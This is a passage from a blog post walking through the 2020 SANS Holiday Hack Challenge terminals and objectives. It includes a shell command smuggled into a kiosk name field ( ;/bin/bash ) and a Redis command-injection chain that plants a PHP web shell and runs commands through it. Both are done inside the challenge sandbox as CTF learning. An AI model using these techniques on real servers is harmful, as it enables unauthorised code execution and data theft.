<!doctype html><html lang=en dir=auto>
<head><meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
<meta name=robots content="index, follow">
<title>the 2020 kinglecon 3 holiday hack challenge | #!/bin/note
</title>
<meta name=keywords content>
<meta name=description content="foreword After tweaking the final bits for a successful MD5 hash collision in a tampered blockchain block, I&rsquo;m met with a &ldquo;Congratulations&rdquo; message as I had just completed the final objective for the 2020 SANS Holiday Hack Challenge!
For a few days during my holiday break I set out to play the challenge this year. I&rsquo;ve dabbled with Holiday Hack challenges in the past, however, this was the first one I actually finished (thanks COVID?">
<meta name=author content="Leon Jacobs">
<link rel=canonical href=https://leonjza.github.io/blog/2020/12/30/the-2020-kinglecon-3-holiday-hack-challenge/>
<link crossorigin=anonymous href=/assets/css/stylesheet.min.5e2b4101351c21e906f398ae96901791830f58d430f96f2659dab7eaef7b3cb7.css integrity="sha256-XitBATUcIekG85iulpAXkYMPWNQw+W8mWdq36u97PLc=" rel="preload stylesheet" as=style>
<script defer crossorigin=anonymous src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://leonjza.github.io/favicon.ico>
<link rel=icon type=image/png sizes=16x16 href=https://leonjza.github.io/favicon-16x16.png>
<link rel=icon type=image/png sizes=32x32 href=https://leonjza.github.io/favicon-32x32.png>
<link rel=apple-touch-icon href=https://leonjza.github.io/apple-touch-icon.png>
<link rel=mask-icon href=https://leonjza.github.io/safari-pinned-tab.svg>
<meta name=theme-color content="#2e2e33">
<meta name=msapplication-TileColor content="#2e2e33">
<meta name=generator content="Hugo 0.88.1">
<noscript>
<style>#theme-toggle,.top-link{display:none}</style>
<style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style>
</noscript>
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-44457032-2','auto'),ga('send','pageview'))</script><meta property="og:title" content="the 2020 kinglecon 3 holiday hack challenge">
<meta property="og:description" content="foreword After tweaking the final bits for a successful MD5 hash collision in a tampered blockchain block, I&rsquo;m met with a &ldquo;Congratulations&rdquo; message as I had just completed the final objective for the 2020 SANS Holiday Hack Challenge!
For a few days during my holiday break I set out to play the challenge this year. I&rsquo;ve dabbled with Holiday Hack challenges in the past, however, this was the first one I actually finished (thanks COVID?">
<meta property="og:type" content="article">
<meta property="og:url" content="https://leonjza.github.io/blog/2020/12/30/the-2020-kinglecon-3-holiday-hack-challenge/"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2020-12-30T14:25:47+02:00">
<meta property="article:modified_time" content="2020-12-30T14:25:47+02:00"><meta property="og:site_name" content="#!/bin/note
">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="the 2020 kinglecon 3 holiday hack challenge">
<meta name=twitter:description content="foreword After tweaking the final bits for a successful MD5 hash collision in a tampered blockchain block, I&rsquo;m met with a &ldquo;Congratulations&rdquo; message as I had just completed the final objective for the 2020 SANS Holiday Hack Challenge!
For a few days during my holiday break I set out to play the challenge this year. I&rsquo;ve dabbled with Holiday Hack challenges in the past, however, this was the first one I actually finished (thanks COVID?">
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://leonjza.github.io/posts/"},{"@type":"ListItem","position":3,"name":"the 2020 kinglecon 3 holiday hack challenge","item":"https://leonjza.github.io/blog/2020/12/30/the-2020-kinglecon-3-holiday-hack-challenge/"}]}</script>
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"the 2020 kinglecon 3 holiday hack challenge","name":"the 2020 kinglecon 3 holiday hack challenge","description":"foreword After tweaking the final bits for a successful MD5 hash collision in a tampered blockchain block, I\u0026rsquo;m met with a \u0026ldquo;Congratulations\u0026rdquo; message as I had just completed the final objective for the 2020 SANS Holiday Hack Challenge!\nFor a few days during my holiday break I set out to play the challenge this year. I\u0026rsquo;ve dabbled with Holiday Hack challenges in the past, however, this was the first one I actually finished (thanks COVID?","keywords":[],"articleBody":"  foreword After tweaking the final bits for a successful MD5 hash collision in a tampered blockchain block, I’m met with a “Congratulations” message as I had just completed the final objective for the 2020 SANS Holiday Hack Challenge!\nFor a few days during my holiday break I set out to play the challenge this year. I’ve dabbled with Holiday Hack challenges in the past, however, this was the first one I actually finished (thanks COVID?). Anyways, this post is basically one big spoiler, but details on the challenges and how I solved ‘em follows.\nTo help navigate this monster, I suggest you check out the table of contents on the side.\nintro Knowing the format of Holiday Hack and how to actually get to challenges is something I struggled with in the past. Having a character that bounces around a map is confusing, and unexpected at first. But, once you figure out which bits are important (your location, your badge and the challenges themselves), you should be good to go. This post is a good “getting started” guide to demystify some of that stuff for the 2020 challenges.\nEmbrace the format, it’s part of the fun.\n  me and some hacker fam in the talks lobby!   I won’t repeat all of the logistics, instead, I want to dive straight into the challenges themselves. Basically, there were two “types” of challenges. The main objectives and the “terminal” challenges. Terminal challenges were typically easier (but definitely fun and challenging too!), and once completed the Elf next to the terminal would provide some hints and other info for objectives.\nformat I never really found myself in a position where I did not have an idea of what I had to do. Very clear directions on the challenges were given in the form of hints from Elves, solving terminal challenges or by viewing the Hints section in your badge.\nterminals Once completed, terminal challenges would reveal vital hints for the main objectives, so clearing them was really useful and fun!\nunescape tmux Pepper Minstix stands next to a terminal called “Unescape Tmux” in the entry area. Something about watching a bird, I don’t know.\n  pepper minstix being... weird.     unescape tmux initial shell   Solving this challenge is really, really easy. You can check out existing tmux sessions with tmux ls. If there is only one, running tmux attach will reattach to it.\n  right...   Anyways, solving this one gives us some information about the Santavator and how to operate it.\n You found her! Thanks so much for getting her back!\nHey, maybe I can help YOU out!\nThere’s a Santavator that moves visitors from floor to floor, but it’s a bit wonky.\nYou’ll need a key and other odd objects. Try talking to Sparkle Redberry about the key.\nFor the odd objects, maybe just wander around the castle and see what you find on the floor.\nOnce you have a few, try using them to split, redirect, and color the Super Santavator Sparkle Stream (S4).\nYou need to power the red, yellow, and green receivers with the right color light!\n kringle kiosk Shinny Upatree stands next to a terminal called “Kringle Kiosk” in the entry area. Apparently this terminal has a map, some form of badge printer and more!\n  shinny upatree looking dashing   Starting the challenge we get.\n  kringle kiosk initial shell   From the initial output we’re asked if we can get a bash shell.\nHitting enter after that message we’re presented with a menu with a few options. Playing with option 4 to Print Name Badge, if you entered ;/bin/bash as your name you will solve the challenge and get the shell.\n  kringle kiosk bash shell   I was curious about where the cowsay came from, which looks like it was as a result of the ~/.bashrc file (there has to be more here…):\n# file: ~/.bashrc export PAGER=less export PATH=/usr/games:$PATH /home/elf/runtoanswer WelcomeToSantasCastle cat /opt/success.txt sleep 2 linux primer Sugarplum Mary stands next to a terminal called “Linux Primer” in the courtyard. Apparently this terminal has some Linux basic’s material we have to go through.\n  linux primer in courtyard   There isn’t much to say about this challenge. It’s very basic Linux stuff that you need to do based on the question that you get on the top pane. An example of what that looks like is below.\n  linux primer challenge flow   Solving this challenge gave hints for the Point-of-Sale objective.\nspeaker unprep Bushy Evergreen stands next to a terminal called “Speaker UNPrep” in the courtyard. Looks like Bushy needed help opening the Speaker Unpreparedness room.\n  speaker unpreparedness in the talks lobby   Opening the terminal challenge for the first time shows the following:\n  speaker unpreparedness terminal welcome message   This challenge actually consisted of three challenges in total; door, lights and vending machine and Bushy was happy to give hints for each after completing one. Editable versions of each challenge lived in the lab/ directory, making it possible to fiddle with them and not break the “real” ones.\ndoor The most important of the challenges, but also the easiest one, we start by just running the door program and see how it behaves.\nelf@aaa8cc7e08d2 ~ $ ./door You look at the screen. It wants a password. You roll your eyes - the password is probably stored right in the binary. There's gotta be a tool for this... What do you enter?  poo Checking...... Beep boop invalid password Ok, poo is not the password. If we run strings over the binary we could maybe narrow it down. A good string to search for would be “What do you enter?\". I usually grep for these types of things to narrow a match down with a little bit of context using the -A and -B flags to print me some data before and after a match. The output from strings over a binary can be noisy, so this is a bit of a habit I guess.\nelf@aaa8cc7e08d2 ~ $ strings door | grep -i \"what do you enter\" -A 10 -B 10 6666666666666666\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\ vRQ 8STs LwH' at 0123456789abcdef ) when slicing ` connection resetentity not foundalready borrowed$ /home/elf/doorYou look at the screen. It wants a password. You roll your eyes - the password is probably stored right in the binary. There's gotta be a tool for this... What do you enter?  opendoor (bytes Overflowextern \" NulErrorBoxthread 'expected, found Door opened! That would have opened the door! Be sure to finish the challenge in prod: And don't forget, the password is \"Op3nTheD00r\" Beep boop invalid password src/liballoc/raw_vec.rscapacity overflowa formatting trait implementation returned an error/ usr/src/rustc-1.41.1/src/libcore/fmt/mod.rsstack backtrace: - cannot panic during the backtrace function/usr/src/rustc-1.41.1/vendor/backtrace/src/lib.rsS omething went wrong: Checking...Something went wrong reading input: Something went wrong in the environment: couldn't get the executable name Something went wrong in the environment: RESOURCE_IDThe error message is: ask for help! Notice the section that reads And don't forget, the password is \"Op3nTheD00r\" ? There’s the password too! If you just grepped for password you would have also found this.\nelf@aaa8cc7e08d2 ~ $ ./door You look at the screen. It wants a password. You roll your eyes - the password is probably stored right in the binary. There's gotta be a tool for this... What do you enter?  Op3nTheD00r Checking...... Door opened! lights Running the lights program the output makes quite a big fuss about the lights.conf configuration file.\nelf@51340abdb0bc ~/lab $ ./lights The speaker unpreparedness room sure is dark, you're thinking (assuming you've opened the door; otherwise, you wonder how dark it actually is) You wonder how to turn the lights on? If only you had some kind of hin---  CONFIGURATION FILE LOADED, SELECT FIELDS DECRYPTED: /home/elf/lab/lights.conf ---t to help figure out the password... I guess you'll just have to make do! The terminal just blinks: Welcome back, elf-technician What do you enter?  Investigating the configuration files’ contents shows what looks like an “encrypted” version of the password is stored.\nelf@51340abdb0bc ~/lab $ cat lights.conf password: E$ed633d885dcb9b2f3f0118361de4d57752712c27c5316a95d9e5e5b124 name: elf-technician I fiddled with the values for a bit, and eventually set the password value for name and ran lights again after reading the hint we had on our badge.\nelf@5641592049a0 ~/lab $ cat lights.conf password: E$ed633d885dcb9b2f3f0118361de4d57752712c27c5316a95d9e5e5b124 name: E$ed633d885dcb9b2f3f0118361de4d57752712c27c5316a95d9e5e5b124 elf@5641592049a0 ~/lab $ ./lights The speaker unpreparedness room sure is dark, you're thinking (assuming you've opened the door; otherwise, you wonder how dark it actually is) You wonder how to turn the lights on? If only you had some kind of hin---  CONFIGURATION FILE LOADED, SELECT FIELDS DECRYPTED: /home/elf/lab/lights.conf ---t to help figure out the password... I guess you'll just have to make do! The terminal just blinks: Welcome back, Computer-TurnLightsOn What do you enter?  Computer-TurnLightsOn Checking...... That would have turned on the lights! If you've figured out the real password, be sure you run /home/elf/lights Noticed the Computer-TurnLightsOn there? That’s the password ;) Looks like the program jumps into an opportunistic decryption routine if a value starts with E$. lol.\nWith that done, running the real light program should turn the lights on in the Speaker Unpreparedness room.\n[ ... ] What do you enter?  Computer-TurnLightsOn Checking...... Lights on! vending-machine This was actually the very last challenge I solved, and honestly, I don’t like my solution. From all of the hints available both on your badge and from Bushy Evergreen I gathered that it was a classic Vigenère cipher that needed cracking, but alas, I couldn’t solve it that way.\nRunning the ./vending-machine binary, you were asked to enter a code to turn the vending machine back on. Inspecting the vending-machines.json configuration file next to the binary we see:\n{ \"name\": \"elf-maintenance\", \"password\": \"LVEdQPpBwr\" } In the lab/ folder, if we delete the vending-machine.json file and re-run the vending-machine binary, we’re asked to enter new fields for a new configuration file. This is what I figured was the Chosen plaintext primitive for the Vigenère crack, but alas, that failed for me.\nAfter many, many attempts at solving this I asked for some help and was told some people were just brute forcing the password. So, again in the lab/ folder I tested the output you’d get in the vending-machine.json when choosing single character passwords, and eventually came to see if we used something that started with a C, we’d get an output string of L line in the password field in the .json file.\nIn the end, I scripted the brute force. Not my proudest moment, but I really tried!\n#!/bin/bash  PASS=\"\" # this eventually fills to CandyCane1 MATCH=\"LVEdQPpBwr\" test_pass() { local C=\"${PASS}$1\" rm -f vending-machines.json printf \"a\\n${C}\\n\" | ./vending-machines /dev/null R=$(grep password vending-machines.json | cut -d '\"' -f 4) echo \"[i] got ${R}\" grep -E \"^${R}\"  $MATCH RETVAL=$? if [ ${RETVAL} -ne 0 ]; then return fi PASS=${C} } while true do for L in {{0..9},{A..Z},{a..z}}; do echo \"[i] trying ${L}\" test_pass $L echo \"[i] pass thus far: ${PASS}\" done done In the end, the password was CandyCane1.\nthe elf code Ribb Bonbowford stands next to a terminal called “The Elf C0de” in the dining room. Pretty evil looking Elf if you ask me! Looks like this challenge is a programming game, specifically targeting JavaScript.\n  the elf c0de terminal in the dining room   Here you are presented with a 2D game where you need to control your character using a small JavaScript program. Each level is different and presents you with a gradually more difficult problem to solve.\n  the elf c0de terminal in the dining room   The above screenshot is level 1, and could be solved with the following two lines:\nelf.moveTo(lollipop[0]); elf.moveUp(10); Some levels had nested challenges that you had to solve using code as well. These were to do things like open trap doors, remove “yeeters” etc. You had to click the challenge object to know what you had to do in code to solve it too, submitting an answer with something like elf.pull_lever().\n  level 2 lever objective description   So, to solve level 2, you had to add 2 to whatever value you got when you called get_lever(0). The rest of my solutions follow.\nLevel 2\nelf.moveTo(lever[0]); elf.pull_lever(elf.get_lever(0) + 2); elf.moveLeft(4); elf.moveUp(10); Level 3\nelf.moveTo(lollipop[0]); elf.moveTo(lollipop[1]); elf.moveTo(lollipop[2]); elf.moveUp(1); Level 4\nfor (var i = 0; i  40; i++) { elf.moveLeft(1); elf.moveUp(12); elf.moveLeft(1); elf.moveDown(12); } Level 5\nelf.moveTo(lollipop[0]); elf.moveTo(munchkin[0]); elf.tell_munch(elf.ask_munch(0).filter(e = typeof(e) === 'number')); elf.moveUp(2); Level 6\nfor (var i = 0; i  4; i++) { elf.moveTo(lollipop[i]); } elf.moveTo(lever[0]); elf.pull_lever([\"munchkins rule\", ...elf.get_lever(0)]); elf.moveTo(munchkin[0]); elf.moveUp(2); After level 6 the challenge is considered complete. There are more levels that were optional to do. I marked those to come back to later. After completion Ribb Bonbowford would tell us that the Santavator could probably be pwnd with some JavaScript.\n33.6 kbps Fitzy Shortstack stands next to a phone labelled “33.6kbps” in the kitchen. Talking to Fitzy reveals that the lights on the Christmas trees are controlled using this dialup modem connection, but the modem seems broken. We’re given a number, 756-8347 to dial.\n  33.6kbps telephone in the kitchen.   Opening the phone by clicking on it we see this.\n  phone ui   Picking up the phone and dialling the number you’d hear a warped version of initial beep from the ever popular dialup sequence you would hear way, waaaay back (yeah, I remember those!). One of the hints Fitzy linked to was a recording of that exact sound here: https://upload.wikimedia.org/wikipedia/commons/3/33/Dial_up_modem_noises.ogg\nThe words on the note next to the phone corresponded to different sections of the dialup sequence, but they were morphed making them hard to identify quickly. I opened the reference .ogg file in Audacity and started piecing together the bits needed.\nAfter dialling, the final sequence of words you had to click on the note were:\n baaDEEbrr aaah wewewwrwrrwrr beDURRdunditty (followed quickly by) SCHHRRHHRTHRTR  Completing this challenge has Fitzy telling us that santa really trusts Shinny Upatree which is a hint as to who’s HID card to clone to open the workshop.\nredis bug hunt Holly Evergreen stands next to a terminal called “Redis Bug Hunt” in the kitchen. Sounds like there is some bug they have not confirmed and we have to find it! This was definitely one of the more fun terminal challenges for me!\n  redis bug hunt terminal in the kitchen   Opening the terminal presents us with a starting point.\n  redis bug hunt terminal initial shell   Let’s check out that index.php page quickly.\nplayer@f9292a141ef5:/var/www$ curl http://localhost/index.php Something is wrong with this page! Please use http://localhost/maintenance.php to see if you can figure out what's going on player@f9292a141ef5:/var/www$ Yep, that looks broken! Next, what about that suggested curl command to maintenance.php.\nplayer@3cc815ce5966:~$ curl http://localhost/maintenance.php ERROR: 'cmd' argument required (use commas to separate commands); eg: curl http://localhost/maintenance.php?cmd=help curl http://localhost/maintenance.php?cmd=mget,example1 player@3cc815ce5966:~$ Looks like we need to specify a cmd argument. Based on the second example having mget, I realised these cmd’s may be raw Redis CLI commands. Great! I’ve definitely exploited RCE via redis before, and one of the hints on your badge confirmed that too! Let’s get to work.\nFirst, just to confirm cmd really is passed to the redis CLI:\nplayer@f9292a141ef5:~$ curl http://localhost/maintenance.php?cmd=help Running: redis-cli --raw -a '' 'help' redis-cli 5.0.3 To get help about Redis commands type: \"help @\" to get a list of commands in  \"help \" for help on  \"help \" to get a list of possible help topics \"quit\" to exit To set redis-cli preferences: \":set hints\" enable online hints \":set nohints\" disable online hints Set your preferences in ~/.redisclirc Excellent. Next question, where is this redis server? Maybe it’s on another host? I checked to see if our current box has a redis-server running:\nplayer@f9292a141ef5:~$ ps -ef | grep redis root 6 1 0 10:54 pts/0 00:00:00 /usr/bin/redis-server 127.0.0.1:6379 player 61 48 0 10:57 pts/0 00:00:00 grep redis Alright, so the redis-server is local. Running as root too! It won’t necessarily mean we’ll become root exploiting the RCE as the primitive is usually that we can write anything, anywhere. Let’s investigate the web directory for the local web server.\nplayer@f9292a141ef5:~$ cd /var/www/html/ -bash: cd: /var/www/html/: Permission denied player@f9292a141ef5:~$ cd /var/www/ player@f9292a141ef5:/var/www$ ls -la total 20 drwxr-xr-x 1 root root 4096 Nov 24 18:52 . drwxr-xr-x 1 root root 4096 Nov 24 18:52 .. drwx------ 1 www-data www-data 4096 Dec 31 10:54 html player@f9292a141ef5:/var/www$ Ah! We can’t see what’s inside /var/www/html, but redis running as root shouldn’t have any problems with that. That gives us a plan of attack. Write a webshell to somewhere in /var/www/html using the Redis command injection we have, and then execute commands as www-data (the webserver is running as this user) to read the index.php file they mention.\nWriting a web shell via Redis is done by configuring Redis (via the command injection) where to save database snapshots, adding a new key containing a web shell, then saving a snapshot. This results in the web shell being written to the path we specified.\nWe know the web server is configured to use PHP, so a small PHP webshell like this should be fine.\n`$_GET[1]`?Let’s write the shell to /var/www/html/c.php. Remember the hint we got when we cURL’d the maintenance.php file stating that commands should be separated by commas. I lost some time by not reading that properly.\nplayer@8bba634ccf77:~$ curl http://localhost/maintenance.php?cmd=\"config,set,dir,/var/www/html\" Running: redis-cli --raw -a '' 'config' 'set' 'dir' '/var/www/html' OK player@8bba634ccf77:~$ curl http://localhost/maintenance.php?cmd=\"config,set,dbfilename,c.php\" Running: redis-cli --raw -a '' 'config' 'set' 'dbfilename' 'c.php' OK player@8bba634ccf77:~$ curl http://localhost/maintenance.php?cmd=\"set,shell,%3C%3F%3D%60%24_GET%5B1%5D%60%3F%3E\" Running: redis-cli --raw -a '' 'set' 'set' 'And just to confirm the url encoding of our shell meant that the value was correctly stored in Redis.\nplayer@8bba634ccf77:~$ curl http://localhost/maintenance.php?cmd=\"get,shell\" Running: redis-cli --raw -a '' 'get' 'set'  player@8bba634ccf77:~$ curl http://localhost/maintenance.php?cmd=\"save\" Running: redis-cli --raw -a '' 'save' OK Assuming that worked, we can now call our PHP web shell!\ncurl http://localhost/c.php?1=id --output - REDIS0009� redis-ver5.0.3� �edis-bits�@�ctime��_used-mem�p aof-preamble��� shelluid=33(www-data) gid=33(www-data) groups=33(www-data) example2#We think there's a bug in index.phexample1¬The site is in maintenance mode�?E�=��pl The output seems a bit messed up, and there is a perfectly reasonable explanation for this. See, when we saved the Redis database, it also saved everything else that was stored in it. The fact that we enclosed our webshell with  \u0026 ? tags just means that that specific section will be interpreted by the PHP interpreter. Everything else will output raw. Heh. (In pure PHP files you can leave out the trailing ?, but in this case that would break the shell).\nSo, to solve the challenge we can just cat the index.php file.\nayer@f9bfa34faa14:~$ curl http://localhost/c.php?1=cat%20index.php --output - REDIS0009� redis-ver5.0.3� �edis-bits�@�ctime��_used-mem�p aof-preamble��� shellexample2#We think there's a bug in index.phexample1¬The site is in maintenance mode�?E�=��pl Solving this challenge unlocks hints for the Broken Tag Generator objective.\nscapy prepper Alabaster Snowball stands next to a terminal called “Scapy Prepper” in the netwars room. Looks like this is just a gentle scapy introduction.\n  scapy prepper terminal in the netwars room   Opening the terminal presents us with a starting point.\n  scapy prepper terminal initial shell   This is a really, really simple terminal challenge. Answering the questions simply takes fiddling around as they suggest in the questions, and some simple documentation scanning.\nA transcript of what my answers were:\n task.submit('start')  task.submit(send)  task.submit(sniff)  task.submit(1)  task.submit(rdpcap)  task.submit(2)  task.submit(UDP_PACKETS[0])  task.submit(TCP_PACKETS[1][IP][TCP])  UDP_PACKETS[0][IP].src = '127.0.0.1'  task.submit(UDP_PACKETS[0])  TCP_PACKETS.show() 0000 Ether / IP / TCP 192.168.0.114:1137  192.168.0.193:ftp S 0001 Ether / IP / TCP 192.168.0.193:ftp  192.168.0.114:1137 SA 0002 Ether / IP / TCP 192.168.0.114:1137  192.168.0.193:ftp A 0003 Ether / IP / TCP 192.168.0.193:ftp  192.168.0.114:1137 PA / Raw 0004 Ether / IP / TCP 192.168.0.114:1137  192.168.0.193:ftp PA / Raw 0005 Ether / IP / TCP 192.168.0.193:ftp  192.168.0.114:1137 PA / Raw 0006 Ether / IP / TCP 192.168.0.114:1137  192.168.0.193:ftp PA / Raw 0007 Ether / IP / TCP 192.168.0.193:ftp  192.168.0.114:1137 PA / Raw  TCP_PACKETS[6]   task.submit('echo')  task.submit(ICMP_PACKETS[1][ICMP].chksum)  task.submit(3)  task.submit(IP(dst='127.127.127.127')/UDP(dport=5000))  task.submit(IP(dst='127.2.3.4')/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname='elveslove.santa')))  ARP_PACKETS[1][ARP].op = 2  ARP_PACKETS[1][ARP].hwsrc = \"00:13:46:0b:22:ba\"  ARP_PACKETS[1][ARP].hwdst = \"00:16:ce:6e:8b:24\"  task.submit(ARP_PACKETS) Solving this challenge revealed more broken tag generator objective hints.\ncan-bus investigation Wunorse Openslae stands next to a terminal called “CAN-Bus Investigation” in the netwars room. Looks like were about to do some car hacking\n  can-bus investigation terminal in the netwars room   Opening the terminal presents us with a starting point.\n  can-bus investigation terminal initial shell   Now this one was tricky for me initially because I misread the question. The terminal states that you need to find the UNLOCK command:\n Also in the data are a LOCK signal, an UNLOCK signal, and one more LOCK. Can you find the UNLOCK? We’d like to encode another key mechanism.\n I thought there was another unlock, after the second LOCK. Turns out they just wanted the timestamp for the single UNLOCK command in the log. Some simple grep should be enough to find it. Just reduce the log entries until you have narrowed it down. The log primarily has 244 entries, so filter those out first. Next were the 188 commands. That should leave you with this:\nelf@0a028f799e8a:~$ cat candump.log | grep -Ev \"244|188\" (1608926664.626448) vcan0 19B#000000000000 (1608926671.122520) vcan0 19B#00000F000000 (1608926674.092148) vcan0 19B#000000000000 That second one is probably the unlock, so run the binary suggested with 122520 entered when asked.\nelf@0a028f799e8a:~$ ./runtoanswer There are two LOCK codes and one UNLOCK code in the log. What is the decimal portion of the UNLOCK timestamp? (e.g., if the timestamp of the UNLOCK were 1608926672.391456, you would enter 391456.  122520 Your answer: 122520 Checking.... Your answer is correct! Solving this challenge has Wunorse tell us that Santa’s Sleigh uses a variation of CANBUS called CAN-D Bus. There’s also something up with the brakes and door locks, and he suggests we filter out messages that seem out of place.\nsort-o-matic Minty Candycane stands next to a terminal called “Sort-o-matic” in the workshop. This terminal seems to be a present sorter based on Regular Expressions. This challenge was also the one I disliked the most. It was finiky, and well, it was regex based :(\n  sort-o-matic terminal in the workshop   Opening the terminal presents us with a starting point.\n  sort-o-matic terminal initial screen     sort-o-matic terminal initial answers screen   You could click on the questions to get an idea of what type of regular expression they looked for. Some questions had example data that the regex had to match and not match. I had valid answers that would have invalid matches be accepted, which wasn’t great.\n  sort-o-matic question format   My answers to the 8 questions were (thanks @hypnza for saving my sanity here):\n1. \\d 2. [a-zA-Z]{3,} 3. [a-z0-9]{2,} 4. [^A-L^1-5]{2,} 5. ^[0-9]{3,}$ 6. ^(?:([01]?\\d|2[0-3]):([0-5]?\\d){2}:)?([0-5]?\\d)$ 7. ^([0-9A-Fa-f]{2}:){5}([0-9A-Fa-f]{2})$ 8. ^([0-9]{2}[\\/.-][0-2]{1}[0-9]{1}[\\/.-][0-9]{4})$ (thanks @Hypn) Solving this terminal unlocked some hints for the Splunk objective.\nsnowball fight Tangle Coalbox stands next to a terminal called “Snowball Fight” in the Speaker Unpreparedness Room. This terminal seems to be a battleships-like game where you face off against a computer opponent.\n  snowball fight terminal in the speaker unpreparedness room   Opening the terminal presents us with a splash screen where we could choose a difficulty, and for some levels, a player name. A suggested name was given at the start as an integer.\n  snowball fight game splash screen   Starting a game you see two squares, one where your fortresses are and another where you have to guess where your enemies' fortresses are.\n  snowball fight player fortresses     snowball fight enemy fortresses that you guessed   The aim was to win a game on impossible, but if you gave that a try you’d see that it’s pretty much impossible. The computer always hit your fortresses with perfect accuracy. Reading the hints given on your badge and by Tangle Coalbox you’d come to realise that the aim here was to predict the numbers used by the computers random number generator. When you chose to play an easy game, your username was used as a seed to determine where all of the fortresses (yours and the computers) would be positioned. If you started multiple consecutive games with the same name (read: seed), the positions would have been exactly the same.\nBut on impossible you don’t get to choose your name, the computer generated it for you, and what’s worse, you don’t get to see what it chose. This is what we had to predict. Watching Tom Liston’s talk was key for me to solving this. I learnt a ton about the Mersenne Twister pseudorandom number generator (PRNG), and ways to abuse it. Tim’s talk also contained a link to a project of his to help predict the next values of a PRNG granted you were able to seed it with at least 624 previous, sequential values here.\nAnyways, I’m repeating what Tom said in the talk, but I really enjoyed this one okay :) Back to the game, when you start a game on impossible, (conveniently) 624 seeds are placed in an HTML comment that you can view.\n  snowball fight impossible seeds in comment   Right at the end of that comment you’d find:\n3206067930 - Not random enough 288869423 - Not random enough 1494780797 - Not random enough 4089687663 - Not random enough  - Perfect! -- Couple this with Tom’s code and we have everything we need to beat the game on impossible. I played around a bit with the PRNG predictor to test that it works fine, and then moved on to extracting the numbers from the game’s HTML comment to feed into the predictor. I copied the comment out and ran it through this one-liner.\ncat seeds.txt | awk -F'-' '{print $1}' | awk '{print $1}'  seed Next, I wrote a small script that imported the mt19937 class and untemper function from Tom’s code, read the seeds from my file, populated the 624 values it had and then ran the extract_number() function to get the next value. Pretty much exactly like it was done in the script’s example.\nfrom mt19937 import mt19937, untemper with open('seeds', 'r') as f: seeds = f.readlines() seeds = [int(x.strip()) for x in seeds] myprng = mt19937(0) for i in range(mt19937.n): myprng.MT[i] = untemper(seeds[i]) print(f'next #: {myprng.extract_number()}') Using the predicted number of 324105638, we then start a new easy game making 324105638 our username in an incognito tab, winning it to reveal the positions of the enemy fortresses.\n  snowball fight easy game with predicted seed   Knowing where the enemy’s fortresses are with the predicted seed, we can now play a surgically accurate game on impossible.\n  snowball fight easy game with predicted seed   Solving this challenge provides hints for the later blockchain challenges, 11a \u0026 11b.\nobjectives Many of the objectives required hints from some of the terminal challenges first. I didn’t really have a strategy other than walking around and clicking on terminals as I saw them. As I went through them, I chose to do the main objectives that were available next to them as well. At first, only the first 5 main objectives were visible until you unlocked the door in Santas workshop to impersonate him.\n1 - uncover santas gift list When you first login you start off in a staging area. The first objective on your badge reads:\n There is a photo of Santa’s Desk on that billboard with his personal gift list. What gift is Santa planning on getting Josh Wright for the holidays? Talk to Jingle Ringford at the bottom of the mountain for advice.\n Hopping around to the top left reveals the billboard, and when you click it a new tab opens with the image: https://2020.kringlecon.com/textures/billboard.png\n  billboard in the staging area   The part you need to focus on in the image is the list at the bottom left that has this “swirling” effect to it. It isn’t easy to make out what it says, as expected. But, if you’ve ever played with image editing tools before you’d know that it’s not hard to create this effect.\n  santas swirled gift list   This challenge had me mad. I tried many tools, tweaking their “swirl-tool” equivalent’s properties such as size, “harshness” etc. applying the swirling effect in the opposite direction (right). In the end, I used https://www.photopea.com/’s “Twirl” tool but instead of trying to “untwirl” the whole list, I had success with a smaller “untwirl” revealing Josh’s entry as getting a proxmark.\n  josh getting a proxmark!   2 - investigate s3 bucket  When you unwrap the over-wrapped file, what text string is inside the package? Talk to Shinny Upatree in front of the castle for hints on this challenge.\n   investigate s3 bucket in the entry area   Talking to Shinny Upatree, we get (after solving the terminal next to the challenge):\n Say, we’ve been having an issue with an Amazon S3 bucket.\nDo you think you could help find Santa’s package file?\nJeepers, it seems there’s always a leaky bucket in the news. You’d think we could find our own files!\nDigininja has a great guide, if you’re new to S3 searching.\nHe even released a tool for the task - what a guy!\nThe package wrapper Santa used is reversible, but it may take you some trying.\n Great, so get a file from S3, and have a look at it? The opening terminal for this challenge looked like this.\n  investigate s3 bucket starting terminal   A directory called bucket_finder contained Bucket Finder by @digininja pre-setup with a wordlist. Running it gave:\nelf@cb4ef197f1c4:~/bucket_finder$ ./bucket_finder.rb wordlist http://s3.amazonaws.com/kringlecastle Bucket found but access denied: kringlecastle http://s3.amazonaws.com/wrapper Bucket found but access denied: wrapper http://s3.amazonaws.com/santa Bucket santa redirects to: santa.s3.amazonaws.com http://santa.s3.amazonaws.com/ Bucket found but access denied: santa I was stumped for a while on this one. Most of my attempts was me messing with permutations of the words in the provided word list (I figured those bucket names were generic and surely they were taken before Kringlecon 3), until I noticed the 